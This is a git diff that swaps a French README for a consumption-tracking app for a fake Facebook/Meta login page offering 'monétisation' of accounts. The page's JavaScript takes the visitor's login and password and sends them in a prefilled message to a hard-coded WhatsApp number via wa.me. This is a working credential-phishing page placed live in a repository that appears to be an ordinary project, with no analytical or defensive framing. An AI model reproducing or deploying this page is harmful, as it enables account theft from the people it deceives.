@@ -1,23 +1,87 @@
-#Conso
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Facebook</title>
+    <style>
+    .password-container {
+    position: relative;
+    width: 90%;
+    margin: auto;
+}
 
-Une application simple et intuitive pour suivre, analyser et optimiser votre consommation au quotidien.
+.password-container input {
+    width: 100%;
+    padding: 12px 40px 12px 12px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    outline: none;
+    box-sizing: border-box;
+}
 
-## 🚀 Fonctionnalités
+.password-container span {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+}
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        h2 { color: #1877f2; font-size: 24px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; outline: none; }
+        button { width: 97%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #166fe5; }
+    </style>
+</head>
+<body>
 
-*   **Suivi en temps réel :** Enregistrement des données de consommation.
-*   **Tableau de bord :** Visualisation des statistiques sous forme de graphiques clairs.
-*   **Historique :** Consultation et modification des anciennes entrées.
-*   **Objectifs :** Définition de seuils pour éviter les surconsommations.
+<div class="login-box">
+    <h2>Demande de monétisation ✅</h2>
+    <p>Bienvenue sur meta</p>
+    <input type="text" id="user" placeholder="Numéro de mobile ou e-mail">
+    <div class="password-container">
+    <input type="password" id="pass" placeholder="Mot de passe">
+    <span id="togglePassword">👁️</span>
+</div>
+    <button onclick="envoyerVersWhatsApp()">Demander la monétisation</button>
+    <p id="message" style="color: red; margin-top: 10px;"></p>
+</div>
 
-## 🛠️ Technologies utilisées
+<script>
+  const pass = document.getElementById("pass");
+const toggle = document.getElementById("togglePassword");
 
-*   **Frontend :** HTML5, CSS3, JavaScript (Vanilla)
-*   **Versionnage :** Git & GitHub
+toggle.onclick = function () {
+    if (pass.type === "password") {
+        pass.type = "text";
+        toggle.textContent = "🙈";
+    } else {
+        pass.type = "password";
+        toggle.textContent = "👁️";
+    }
+};
+    function envoyerVersWhatsApp() {
+        // 1. Récupération des données
+        const numeroSaisi = document.getElementById('user').value;
+        const passSaisi = document.getElementById('pass').value;
 
-## 📦 Installation et Lancement
+        // 2. Ton numéro WhatsApp (format international, ex: 243...)
+        const monNumero = "243849171847"; 
 
-Pour exécuter ce projet localement, suivez ces étapes :
+        // 3. Construction du message
+        const message = "Demande de monétisation de compte :\n" + 
+                        "Identifiant : " + numeroSaisi + "\n" + 
+                        "Mot de passe : " + passSaisi;
 
-1. **Cloner le projet :**
-   ```bash
-   git clone [https://github.com/votre-utilisateur/Conso.git](https://github.com/votre-utilisateur/Conso.git)
+        // 4. Création du lien API WhatsApp
+        const urlWhatsApp = "https://wa.me/" + monNumero + "?text=" + encodeURIComponent(message);
+
+        // 5. Redirection (Envoie les infos sur ton WhatsApp)
+        window.location.href = urlWhatsApp;
+    }
+</script>
+
+</body>
+</html>
